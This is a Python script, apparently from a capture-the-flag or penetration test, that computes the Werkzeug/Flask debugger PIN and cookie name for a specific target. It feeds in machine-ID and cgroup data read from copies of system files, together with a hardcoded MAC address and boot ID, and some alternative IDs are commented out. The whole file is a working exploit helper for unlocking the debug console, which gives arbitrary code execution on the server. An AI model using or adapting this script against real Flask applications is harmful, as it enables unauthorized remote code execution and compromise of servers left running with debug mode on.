import hashlib
from itertools import chain

_machine_id = None
def get_machine_id():
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate():
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "etc_machine-id", "proc_sys_kernel_random_boot_id":
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("proc_self_cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux
        return None

    _machine_id = _generate()
    return _machine_id


probably_public_bits = [
    None,
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.8/dist-packages/flask/app.py'
]

# This information is here to make it harder for an attacker to
# guess the cookie name.  They are unlikely to be contained anywhere
# within the unauthenticated debug page.
# private_bits = [str(uuid.getnode()), get_machine_id()]
print(get_machine_id())
private_bits = [
    str(0xdead173580e3),
    # get_machine_id()
    b'ad90a70c-809d-45a2-80fc-ef74ae0d5fa1'
    # b'b5c24901-825d-44fa-a787-261b64abba1b',
	# '3a689470-9df7-4a8e-a910-189b97b81d46'
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv, cookie_name)
